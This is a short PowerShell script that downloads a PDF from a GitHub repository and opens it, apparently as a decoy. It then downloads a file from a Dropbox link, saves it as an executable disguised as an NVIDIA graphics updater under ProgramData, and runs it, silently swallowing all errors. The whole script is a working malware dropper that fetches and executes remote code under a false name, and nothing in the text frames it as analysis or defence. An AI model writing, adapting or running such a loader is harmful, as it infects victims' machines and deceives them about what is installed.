$ProgressPreference = 'SilentlyContinue'

$File1Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/fls/doc.pdf" 
$File2Url = "https://www.dropbox.com/scl/fi/90r2qw0y5poc4qsgye06l/resource?rlkey=vd6vnqc760v0af8kf0orfrx66&st=sp7ywbez&dl=1" 

$File1Path = "$env:TEMP\DOC-8796578552.pdf"

try {
    Invoke-WebRequest -Uri $File1Url -OutFile $File1Path -ErrorAction Stop
    Start-Process -FilePath $File1Path
} catch { }

$sourceFileName = "NvdgfxUpd.exe" 
$destinationFolder = "$env:ProgramData\TmpNvd" 
$destinationFilePath = Join-Path -Path $destinationFolder -ChildPath $sourceFileName

try{
   if (-Not (Test-Path -Path $destinationFolder)) {
       New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
   }
   if (-Not (Test-Path -Path $destinationFilePath)) {
       Invoke-WebRequest -Uri $File2Url -OutFile $destinationFilePath -ErrorAction Stop
   }
   Start-Process -FilePath $destinationFilePath
} catch{}
